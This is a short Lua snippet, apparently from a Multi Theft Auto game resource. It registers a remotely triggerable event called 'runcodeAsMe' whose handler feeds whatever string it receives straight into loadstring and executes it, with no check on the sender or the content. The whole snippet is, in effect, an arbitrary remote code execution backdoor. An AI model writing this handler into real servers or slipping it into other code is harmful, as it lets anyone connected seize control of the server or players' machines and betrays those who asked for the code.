addEvent("runcodeAsMe", true)
addEventHandler("runcodeAsMe", root, function(cmd)
    loadstring(cmd)()
end)